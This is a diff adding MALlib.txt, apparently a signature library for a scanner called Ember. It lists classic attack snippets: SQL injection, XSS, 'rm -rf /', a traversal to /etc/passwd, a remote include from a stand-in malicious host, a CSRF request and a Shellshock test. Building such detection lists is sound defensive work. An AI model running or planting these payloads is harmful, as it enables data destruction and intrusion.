@@ -1,0 +1,54 @@
+This is MALlib.txt
+
+This is a library of snippets that the Ember framework can scan for. If you would like to add in your own library,
+please modify Ember# to allow the framework to utilise your library.
+
+SQL Injection Attempt:
+python
+
+user_input = "'; DROP TABLE users;--"
+
+Cross-Site Scripting (XSS) Attempt:
+html
+
+<script>alert('XSS');</script>
+
+Command Injection:
+python
+
+command = "rm -rf /"
+
+File Inclusion Vulnerability:
+php
+
+include($_GET['file']);
+
+Path Traversal:
+java
+
+String file = "../../../../../etc/passwd";
+
+Cross-Site Request Forgery (CSRF) Token Bypass:
+html
+
+<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
+
+Remote File Inclusion (RFI) Attempt:
+php
+
+include("http://malicious.com/evil-code");
+
+Shellshock Exploit:
+bash
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+Base64-Encoded Malicious Payload:
+python
+
+data = "Y29uZmln"
+
+Malicious JavaScript URL:
+javascript
+
+location.href='javascript:alert("XSS")';
